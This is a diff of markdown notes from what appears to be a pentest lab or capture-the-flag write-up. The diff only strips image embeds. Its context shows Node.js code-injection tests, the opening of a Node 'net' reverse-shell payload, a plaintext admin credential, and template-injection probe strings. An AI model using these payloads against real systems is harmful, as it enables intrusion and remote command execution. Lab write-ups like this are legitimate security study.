@@ -17,18 +17,14 @@ Change admin value to true:
 ```
 #### Node.js (Express middleware)
 Below we're able to test this input box by adding 1 + 1
-![[Pasted image 20220304092318.png]]
 and seeing the result of "2".
-![[Pasted image 20220304092332.png]]
 Let's try something more complicated:
 ```node - kali
 (function(){
    return 2+2;
 })();
 ```
-![[Pasted image 20220304092443.png]]
 and we see this also works
-![[Pasted image 20220304092547.png]]
 ```node - kali
 (function(){
     var net = require("net"),
@@ -98,7 +94,6 @@ while stop == False:
 admin:IppsecSaysPleaseSubscribe
 #### Command injection
 First, we notice how the our input for the newsletter is reflected back to us.
-![[Pasted image 20220218114838.png]]
 Test for command injection
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect
 ```
@@ -108,7 +103,6 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 ```
-![[Pasted image 20220218114825.png]]
 Capture in Burp, send to repeater.
 #### Node JS command Injection
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
